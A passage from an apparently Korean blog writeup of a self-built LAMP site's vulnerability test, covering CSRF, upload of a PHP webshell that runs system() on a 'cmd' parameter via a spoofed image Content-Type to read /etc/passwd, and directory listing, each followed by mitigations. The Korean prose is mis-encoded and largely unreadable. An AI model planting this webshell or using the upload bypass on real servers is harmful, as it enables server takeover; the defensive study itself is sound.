<iframe name="A" style="display:none;"></iframe> 
<script>document.write_form.submit();</script>
```
<figcaption>CSRF ๊ณต๊ฒฉ ์ฝ๋</figcaption>

์ ์์ ์ธ ๊ฒ์๊ธ์ ์์ฑ ํ <sup id="fiddler">[[5]](#user-ref5)</sup>`fiddler`๋ก ๊ธ์ฐ๊ธฐ๊ฐ ์ด๋ ํ ๋ฐฉ์์ผ๋ก ์์ฑ์ด ๋์๋์ง <br><sup id="sniffing">[[6]](#user-ref6)</sup>`์ค๋ํ` ํ ํ ํ์ทจํ `ํ๋ผ๋ฏธํฐ์ ๋ณ์`๋ฅผ ์์ CSRF ๊ณต๊ฒฉ ์ฝ๋์ฒ๋ผ ์์์ ๋ง์ถ์ด ์์ฑ ํ ๊ฒ์๊ธ์ ๋ฑ๋กํฉ๋๋ค. ๊ทธ๋ค์ ๋ค๋ฅธ ๊ณ์ ์ผ๋ก ์์ฑํ ๊ฒ์๊ธ(CSRF๋ฅผ ์ฝ๋๊ฐ ์ฃผ์๋ ๊ฒ์๊ธ)๋ฅผ ์ฝ์ผ๋ฉด ์ฌ์ดํธ ๊ฐ `์์ฒญ ์์กฐ`๋ฅผ ํ์๊ธฐ ๋๋ฌธ์ ๋ด๊ฐ ์์ฑํ ๊ธ์ด ์๋์๋ ํด์ปค์ ์ํด์ `์๋์น ์์` ๊ธ์ ์์ฑํ๊ฒ ๋ฉ๋๋ค. (* input type="file"์ hidden์ด ์๋จนํ๋ฏ๋ก style์ ๋ฐ๋ก display:none;๋ฅผ ์ด์ฉํ์ฌ ์คํ์ผ๋ง ํด์ฃผ์์ต๋๋ค.)

#### ๋์ ๋ฐฉ์
ํ์ฌ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ ๋ถ๋ถ์ XSS์ ๋์ผํ๊ฒ ๊ฒ์ํ์์ ๊ธ์ ์ธ๋, ๋๊ธ์ ์ธ๋ CSRF๊ณต๊ฒฉ์ด ๊ฐ๋ฅํฉ๋๋ค. <br> CSRF ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํจ์ ๋ฐ๋ผ `ํด์ปค`์ ์ํด์ `์๋์น ์์ ๊ธ`์ `์์ฑ`ํ๊ฒ ๋์์ต๋๋ค.
<br> ์ด๋ฌํ ์ํฉ์ ๋ฐฉ์ดํ๊ธฐ ์ํด์๋ XSS์ ๋์ผํ๊ฒ `์ ํจ์ฑ ๊ฒ์ฌ` <scriptํ๊ทธ, ํ๊ทธ ๋ฌธ์(<,>,",')๋ฅผ `์ด์ค์ผ์ดํ` ํฉ๋๋ค.
"ํ๊ทธ๋ฌธ์ : <(&lt), >(&gt), "(&quot), '(&apos), &(&amp) ๋ฑ๋ฑ" 
<br>์ถ๊ฐ์ ์ผ๋ก ๋ฐฑ์๋ ๋ถ๋ถ์์ `Request`์ `Referer`๋ฅผ ํ์ธํ์ฌ Domain(192.168.35.237)๊ฐ ์ผ์นํ๋์ง ๊ฒ์ฆํฉ๋๋ค.

<br>

<hr>
## 4-4 <sup id="webshell">[[7]](#user-ref7)</sup> `Web Shell`

1. ์น์์ ๋ง ๊ทธ๋๋ก ์น์ฌ์ดํธ๋ฅผ ํตํด `์(shell)์ ์ฌ๋ ๊ณต๊ฒฉ` ์๋๋ค.
2. ์๊ฒฉ์์ ์น์๋ฒ์ `๋ช๋ น์ ์ํ`ํ  ์ ์๋๋ก ์์ฑํ ์น ์คํฌ๋ฆฝํธ (ASP, JSP, PHP, CGI ํ์ผ ๋ฑ) ํํ๋ฅผ ๊ฐ์ง
3. ์น ์๋ฒ์ ๋ค์ํ ์ทจ์ฝ์  (`์๋ฒ ์ทจ์ฝ์ , ์น ์ดํ๋ฆฌ์ผ์ด์ ์ทจ์ฝ์ `) ๋ฑ์ ํ๊น์ผ๋ก ๊ณต๊ฒฉํ์ฌ ์น ์๋ฒ์ ์น์์ ์๋ก๋ํ ํ<br>์ผ๋ฐ์ ์ธ ์น ๋ธ๋ผ์ฐ์  (80 Port)๋ฅผ ํตํ์ฌ ์๋ก๋ํ ์น์์ ์คํํ์ฌ ์นจํฌํ ์๋ฒ์์ `์ ๋ณด ์ ์ถ ๋ฐ ๋ณ์กฐ, ์์ฑ์ฝ๋ ์ ํฌ` ๋ฑ์ ๋ถ๋ฒ ํ์๋ฅผ ํํ๋ ํํ๊ฐ ๋ง์

์ด๋ฒ์๋ `๊ฒ์ํ`์ ํตํด `Web Shell` ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ์ง ํ์ธํด๋ณด๊ฒ ์ต๋๋ค.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbWJyh1%2Fbtrd22XMdp5%2FWy6ByH8wcJu8usZFOuTv51%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 26. ํ์ผ ์๋ก๋ ํ์ธ (1/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdmXSiq%2Fbtrd1zvgbKa%2Fu7s5Y4W1tBbNHSgTGwW3MK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 27. ํ์ผ ์๋ก๋ ํ์ธ (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbyiLcF%2FbtrdZWdTA6i%2F3yOPDs2Uh73O2gMcDniAjK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 28. ํ์ผ ์๋ก๋ ํ์ธ (3/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F27sNp%2Fbtrd14IxI5t%2FAL9Wkve4Pp1Cwoez5Qvpjk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 29. Web Sehll ๊ณต๊ฒฉ (1/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbdQKS8%2FbtrdZVst5GP%2FkTMGb8EDpXYPOXKScnpgNk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 30. Web Sehll ๊ณต๊ฒฉ (2/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FclHe3H%2Fbtrd1xRKaoj%2FekxHDOk9M0FipXv9bA1KVK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 31.Web Sehll ๊ณต๊ฒฉ (3/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FZquWV%2Fbtrd2yQaBaP%2FaXvtPCtTfJNvuwMnzqgv01%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 32. Web Sehll ๊ณต๊ฒฉ (4/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzwmyJ%2Fbtrd0jzVjP6%2F9yEUEVUT3c1cS5giEhUqzk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 33. Web Sehll ๊ณต๊ฒฉ (5/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcmb0J4%2Fbtrd0ywQElW%2FAl7yg7nDOOB7eushxfECXK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 34. Web Sehll ๊ณต๊ฒฉ (6/7)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcDhOXg%2Fbtrd0jmmgyR%2Fa5C9dRTM6S0y0KJmHUqeFK%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 35. Web Sehll ๊ณต๊ฒฉ (7/7)</figcaption>
</figure>

```php
<?php
//
// PoC: a simple webshell 
// Author: Bonghwan Choi
//

echo 'Enter a Command:<br>';
echo '<form action="">';
echo '<input type=text name="cmd">';
echo '<input type="submit">';
echo '</form>';

if (isset($_GET['cmd'])) {
	system($_GET['cmd']);
}
?>
```
<figcaption>Web Shell ๊ณต๊ฒฉ ์ฝ๋</figcaption>

ํ์ฌ `ํ์ผ ์๋ก๋`๋ฅผ ํตํด `Web Shell`์ด ์ด๋ฃจ์ด์ง๊ณ  ์๋ค.
<br>์ ์์ ์ธ ํ์ผ์๋ก๋๋ผ๋ฉด `์ด๋ฏธ์ง ํ์ฅ`(png, jpg, bmp๋ฑ)๋ง ์ด๋ฃจ์ด์ง๊ฒ ๋์ด ์๊ฑฐ๋, `๋ธ๋๋ฆฌ์คํธ ๊ธฐ๋ฐ ํ์ผ ํ์ฅ์`(php, asp, jsp)๋ `ํํฐ๋ง`์ด ๋์ด์๋ค. 
<br>์  ์ฌ๊ธฐ์ ๊ณต๊ฒฉ์ ํ๊ธฐ ์ํด ํผ๋ค๋ฌ๋ฅผ ์ด์ฉํ์ฌ `์์ฒญ`(Request) `๋ณ์กฐํ์ฌ Content-type๋ฅผ ์ฐํ`ํด์ 
Content-Type:application/x-php๊ฐ ์๋ `Content-Type:image/jpeg`๋ก ์์ฌ ์๋ก๋๋ฅผ ํ ํ ๋ฏธ๋ฆฌ ์์ฑํด๋ Web Shell ๊ณต๊ฒฉ์ฝ๋๋ฅผ ํตํด (etc/passwd)๋ฑ์ `์์คํ ํ์ผ`๋ฑ๋ฑ `์ ๊ทผ ์๋`๊ฐ ๊ฐ๋ฅํฉ๋๋ค.

#### ๋์ ๋ฐฉ์
ํ์ฌ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ ๋ถ๋ถ์ ๊ธ์ ์ธ๋ ์๋ก๋ ๋ถ๋ถ์์ ์น์ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํฉ๋๋ค.
<br>์น์ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํจ์ ๋ฐ๋ผ `์์คํ ํ์ผ์ ์ ๊ทผ`์ด ๊ฐ๋ฅํ์์ต๋๋ค.
<br>ํ์ฌ ์๋ฒ์ธก์์ `์ด๋ฏธ์ง ๊ฒ์ฌ`๋ฅผ ํ์ง๋ง `์ฝํํธํ์`๋ง ๊ฒ์ฌํ๊ณ , ํ์ผ๋ช ๋ฐ ํ์ผ๋ด์ฉ๋ฑ `์ ํํ ๊ฒ์ฆ`์ ํ์ง ์์ ๋ฐ์ํ ์ทจ์ฝ์  ์๋๋ค.
<br>์ด๋ฌํ ๊ฒฝ์ฐ๋ฅผ ๋ณด์ ํ๊ธฐ ์ํด์๋ `ํ์ผ๋ด์ฉ(http body ๋ด์ฉ), ํ์ผ๋ช`๋ฑ ์ ํํ ๊ฒ์ฆ์ ํ์ฌ์ผ ํฉ๋๋ค.
<br><br>์ถ๊ฐ์ ์ผ๋ก  `์ด๋ฏธ์ง ํ์ผ์ ์กด์ฌ`ํ๋ `php code`๊ฐ ์คํ๋์ง ์๋๋ก ์ค์ ํ๊ณ , php์์ ์ง์ํ๋ `ํจ์` ๊ธฐ๋ฅ์ `ํ์ฉํ์ง ์๋ ์ต์์ (disable_functions = system, exec, shell_exec)`๋ฅผ ์ ์ด์ฃผ๋๋ก ํฉ๋๋ค.
<br> ๊ทธ๋ฆฌ๊ณ  php ์์ `์๊ฒฉ์ง`์ ์๋ `ํ์ผ์ ์ฝ์ด`์ค์ง ๋ชปํ๋๋ก allow_url_fopen = Off ์ค์ ์ ํด์ค๋๋ค.
<br>
<hr>
## 4-5 `Directory Listing`

1. ๋๋ ํ ๋ฆฌ ๋ฆฌ์คํ์ด๋ ์น์๋ฒ๋ฅผ `๋๋ ํ ๋ฆฌ`๋ก `์ ์`ํ  ๋, ํด๋น ๋๋ ํ ๋ฆฌ๋ด์ `ํ์ผ๊ณผ ๋๋ ํ ๋ฆฌ`๋ฅผ `๋ฆฌ์คํธ`๋ก ๋ณด์ฌ์ฃผ๋ ๊ธฐ๋ฅ์ ๋งํฉ๋๋ค.
2. ๋๋ ํฐ๋ฆฌ ๋ฆฌ์คํ ์ทจ์ฝ์ ์ `๋ธ๋ผ์ฐ์ง ํ๋ ๋ชจ๋  ํ์ผ`์ ๋ณด์ฌ์ค๋ค. 
<br>์๋์ ๋ชฉ์ ์ ๋ฌธ์์ ๊ณต์ ๋ก ํ์ผ ํ์๊ธฐ์ฒ๋ผ `์ํ๋ ๋ฌธ์`๋ก ๋ฐ๋ก ์ฐพ์๊ฐ ์ ์๊ฒ ํ๋ ์ฉ๋์์ง๋ง ์ต๊ทผ์๋ ๋ฌธ์์ ์ ์ฅ ๋ฐ ์ด๋์ด ๊ฐ๋ฅํ๋ค๋ฉด ๋ฌธ์์ `์ทจ์ฝ์ (๋ฐฑ์ํ์ผ ๋ฐ ์์ค์ฝ๋, ์คํฌ๋ฆฝํธ ํ์ผ์ ์ ์ถ๋ก ์ธํ ๊ณ์  ์ ๋ณด ์ ์ถ ๋ฑ๋ฑ)`์ ์ด์ฉํด `์์์ ์ธ ๋ชฉ์ `์ ๊ฐ๊ณ  ์๋ ์ฌ๋๋ค์๊ฒ `ํ์ทจ ๋ฐ ์น์๋ฒ ๊ณต๊ฒฉ`์ด ์ด๋ฃจ์ด์ง๋ค.
<BR>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FSVInk%2Fbtrd14IFX1V%2FR9TKQadHo0uUJoh5NwAk8k%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 36. ๋๋ ํ ๋ฆฌ ๋ฆฌ์คํ</figcaption>
</figure>
html ํ์ด์ง์ ์์ค๋ณด๊ธฐ๋ฅผ ํ  ์ ์์๋, ์ด๋ฏธ์ง ๋ฐ ํ์ผ์ ๊ฒฝ๋ก๊ฐ ์ ํ์๋ ๋ถ๋ถ์ด ์๋ค. ์ฌ๊ธฐ์ URL ๋ถ๋ถ์ ํ์ผ๋ช์ ์ง์ฐ๊ณ  ์๋ ฅํ๋ฉด ๋ค์๊ณผ ๊ฐ์ด ํ์ผ๋ฆฌ์คํธ๋ฅผ ๋ณผ ์ ์์ต๋๋ค.

#### ๋์ ๋ฐฉ์
ํ์ฌ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ ๋ถ๋ถ์ ๋ฉ์ธ๋ถ๋ถ์ ์ ์ธํ URL ๋ถ๋ถ์ ํ์ผ๋ช์ ์ง์ฐ๊ณ  ์ ์์ ๋๋ ํฐ๋ฆฌ๋ก ๋ค์ด๊ฐ์ง๋ ๋ถ๋ถ์์ ์ทจ์ฝ์ ์ด ๋ฐ์๋ฉ๋๋ค.
<br>์ด๋ฌํ ์ทจ์ฝ์ ์ด ๋ฐ์๋๋ฉด ๋ชจ๋  `ํ์ผ๋ช์ด ๋ธ์ถ`์ด ๋๋ฏ๋ก ์ํํ ์ทจ์ฝ์  ์๋๋ค.
<br>ํด๋น ์ทจ์ฝ์ ์ ๋ณด์ํ๊ธฐ ์ํด์๋ ์ํ์น ์น ์๋ฒ์ `/etc/httpd/conf/httpd.conf` ํ์ผ์ ๋ด์ฉ์ค `Options Indexes FollowSymLinks -> Options FollowSymLinks` ๋ก ๋ด์ฉ์ ์์ ํ์ฌ ์ ์ฅํ๋ฉด ๋ฉ๋๋ค.
<br>๊ทธ๋ฌ๋ฉด ์ ์์ 403 ํน์ 404์๋ฌ ๋ฉ์์ง๊ฐ ๋์ค๋๋ฐ 403์ `ํ์ผ ๋ชฉ๋ก`, 404๋ `์กด์ฌํ์ง ์๋ ํ์ด์ง`๋ก ๋์ค๋๋ฐ ์ด๊ฒ๋ ์ทจ์ฝ์ ์ด ๋  ์ ์์ด httpd.conf์์ ์ถ๊ฐ์ ์ผ๋ก `ErrorDocument 403 /index.php, ErrorDocument 404 /index.php` ๋ฉ์ธํ์ด์ง๋ก ์ด๋ํ๊ฒ ํ์ฌ ๋ณด์์ ํ๋ฉด ๋ฉ๋๋ค.

<hr>

# 5. ํ๋ก์ ํธ ๊ฒฐ๊ณผ
์ค๋๋ง์ ๋ค์ lamp๋ก ์น ๊ตฌ์ถ์ ํ๋ ์ฝ๋ฉ๊ณต๋ถ์ ๋์๋ ๋์๊ณ  CSS๋ฅผ ์ง์ ๊ณจ๋ผ ์ํ๋ณด๋ `์ฌ๋ฏธ`์์๋ค. ๊ทธ๋ฆฌ๊ณ  ๊ตฌ์ถํ ํํ์ด์ง๋ฅผ ์ง์  ์ทจ์ฝ์ ๋ ์ ๊ฒํด๋ณด๋ ์ญ์ `๋ณด์๋ ์ค์`ํ๋ค๋๊ฒ์ ๋ง์ด `๋๊ผ๊ณ  ์ฌ์ํ๊ณ  ์ฌ์ด` ์นํดํน ๋ฐฉ๋ฒ์ด์์ง๋ง `OWASP TOP 10์` ๋งค๋ ๋์ค๋ ๋งํผ ํด๋น `์ทจ์ฝ์ `๋ค์ด `์ํ`ํ๋ค๋๊ฒ๋ `์ค๊ฐ`ํ์๋ค.
<br>๋ค์์๋ ์์ ๊ฐ์ `์ทจ์ฝ์  ์ ๊ฒ` ๋ฐ `๋ณด์`์ ํ ๋ ๊ธฐ์ด ๋ถ๋ถ์ ๋์์ด ๋ง์ด ๋  ๊ฒ ๊ฐ๋ค.


<hr>

##### Notes
<small id="user-ref"><sup>[[1]](#sql)</sup> Blind SQL ์ธ์ ์์ ์ฟผ๋ฆฌ๋ฌธ์ ์ฌ์ฉํ๋ ํจ์๋ substring,ascii,limit ๋ฑ์ด ์๋ค.<br>
substringํจ์๋ ์ฒซ ๋ฒ์งธ ์ธ์๋ก ๋ฐ์ ๋ฌธ์์ด์ ์ง์ ํ ๊ธธ์ด๋งํผ ์ถ๋ ฅํ๋๋ฐ, ์ฃผ๋ก ๋ฌธ์ ํ๋์ฉ ์ถ๋ ฅ ํ์ฌ ์ด๋ฆ์ ์์๋ด๋๋ฐ์ ์ฌ์ฉํ๋ค.
<br>asciiํจ์๋ ๋ฌธ์๋ฅผ ์์คํค์ฝ๋๋ก ๋ณํํ๋๋ฐ, ์์๋ฐ์ดํ(')๋ฅผ ์ฐํํ๋ ๋ณ์์ผ ๋ ๋ฌธ์๋ฅผ ์๋ ฅํ๊ธฐ ์ํ์ฌ ์ฌ์ฉํ๋ค.
limit ํจ์๋ ๋ฌธ์์ด์ ๊ธธ์ด๋ฅผ ๋ฐํํ๋ค. ๋ฌธ์ฅ์ด์ ๊ธธ์ด๋ฅผ ์์๋ด๋ฉด substring ํจ์๋ก ๋ฌธ์์ด์ ์ถ์ธกํ๊ธฐ ์ฌ์์ง๋ค.  ์ธ ํจ์๋ฅผ ํตํด ์์์ ๊ฐ์ ์๋ ฅํ๋ฉฐ ๋ฐ์ดํฐ๋ฒ ์ด์ค ๋ด์ฉ์ ์์๋ผ ๋๊น์ง ๊ณ์ ๋น๊ตํ๋ค.</small>
<br>
<br>
<small id="user-ref2"><sup>[[2]](#based)</sup> ์ฐธ๊ณผ ๊ฑฐ์ง๋ง ์ถ๋ ฅํ๋ ํ์ด์ง์ ๊ณต๊ฒฉ์๊ฐ ์กฐ์ํ ์ฟผ๋ฆฌ๋ก ์ธํด ๋ฐ์ดํฐ๋ฒ ์ด์ค ๋ด์ฉ์ ๋ธ์ถํ๋ ์ทจ์ฝ์ ์ด๋ค.  ์ฟผ๋ฆฌ๋ ๋ฐ์ดํฐ๋ฒ ์ด์ค ๋ด์ฉ์ด ์ผ์นํ์ฌ ์น ํ์ด์ง์์ ์ฐธ์ ์ถ๋ ฅ์ํฌ ๋๊น์ง ์์์ ๊ฐ์ ๋์ํ๋ค.</small>
<br>
<br>
<small id="user-ref3"><sup>[[3]](#xss)</sup> ์น ๋ธ๋ผ์ฐ์ ์์ ์ฌ์ฉ์๊ฐ ์๋ ฅ ํ ์ ์๋ inputํ๊ทธ ๋ฑ์ ์์์ ์ธ script๋ฅผ ์์ฑํ์ฌ ํด๋น contents๋ฅผ ์ด์ฉํ๋ ๋ค๋ฅธ ์ด์ฉ์์ ๊ฐ์ธ์ ๋ณด ๋ฐ ์ฟ ํค์ ๋ณด ํ์ทจ, ์์ฑ์ฝ๋ ๊ฐ์ผ, ์น ํ์ด์ง ๋ณ์กฐ๋ฑ์ ๊ณต๊ฒฉ์ ํ๋ค.</small>
<br>
<br>
<small id="user-ref4"><sup>[[4]](#csrf)</sup> ์ ์๋ง ๋ณด๋ฉด ์์ ์์๋ดค๋ XSS์ SQL injection๊ณผ ๋น์ทํ๋ค.
<br>XSS๊ฐ ์ฌ์ฉ์๊ฐ ํน์  ์ฌ์ดํธ๋ฅผ ์ ๋ขฐํ๋ค๋ ์ ์ ๊ณต๊ฒฉํ๋๊ฑฐ๋ผ๋ฉด, CSRF๋ ํน์  ์ฌ์ดํธ๊ฐ ์ฌ์ฉ์์ ๋ธ๋ผ์ฐ์ ๋ฅผ ์ ๋ขฐํ๋ค๋ ์ ์ ๊ณต๊ฒฉํ๋ ๊ฒ์ด ๋ค๋ฅด๋ค.
<br>๊ฐ๋จํ๊ฒ ์ ๋ฆฌํ์๋ฉด, ์์ฑ์ฝ๋๊ฐ XSS: ํด๋ผ์ด์ธํธ์์ ๋ฐ์ / CSRF: ์๋ฒ์์ ๋ฐ์์ด๋ผ๊ณ  ํ  ์ ์๋ค.</small>
<br>
<br>
<small id="user-ref5"><sup>[[5]](#fiddler)</sup> Fiddler ๋ ์ปดํจํฐ์ ์น ์๋ฒ ๋๋ ์๋ฒ ๊ฐ์ HTTP ๋ฐ HTTPS ํธ๋ํฝ ์ ๊ธฐ๋ก, ๊ฒ์ฌ ๋ฐ ๋ณ๊ฒฝํ๋ ๋ฐ ์ฌ์ฉ๋๋ ๋๋ฒ๊น ํ๋ก์ ์๋ฒ ๋๊ตฌ ์๋๋ค.</small>
<br>
<br>
<small id="user-ref6"><sup>[[6]](#sniffing)</sup> Sniffing์ ์ฌ์ ์  ์๋ฏธ๋ ์ฝ๋ฅผ ํํ๊ฑฐ๋ฆฌ๋ค, ๋์๋ฅผ ๋งก๋ค ๋ฑ์ ๋ป์ด ์กด์ฌํ๋ค.<br>
์์ ์ด ์๋์๋๋ฐฉ๋ค์ ํจํท์ด ํต์ ๋ง์ ๋์๋ค๋๋ ๋ฐ์ดํฐ๋ฅผ ๋ชฐ๋ ๋์ฒญํ๋ ํ์์ด๋ค.  ์ ๋ณด์์ฐ์ ๊ธฐ๋ฐ์ฑ์ ์ ํดํ๋ค.</small>
<br>
<br>
<small id="user-ref7"><sup>[[7]](#webshell)</sup>โป์(shell) : ์ฌ์ฉ์์๊ฒ ๋ฐ์ ์ง์๋ฅผ ํด์ํ์ฌ ํ๋์จ์ด ์ง์์ด๋ก ๋ฐ๊ฟ์ผ๋ก์จ ์ด์์ฒด์ ์ ์ปค๋๊ณผ ์ฌ์ฉ์ ์ฌ์ด๋ฅผ ์ด์ด์ฃผ๋ ๊ฒ</small>
<br>
<br>
<hr>

# 6. ์ฐธ๊ณ ์๋ฃ
https://lucete1230-cyberpolice.tistory.com/94
<br>https://velog.io/@codren/%EC%9B%B9-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%A4%EC%8A%B5-2-CSRF
<br>https://websecurity.tistory.com/125
<br>https://m.blog.naver.com/PostView.nhn?isHttpsRedirect=true&blogId=bgpoilkj&logNo=220751401209&proxyReferer=
<br>https://github.com/Veloideu/CIA_WEBSITE (์น ์์ค์ฝ๋๋ ์  ๊นํ์ ์ฌ๋ ค๋์์ต๋๋ค.)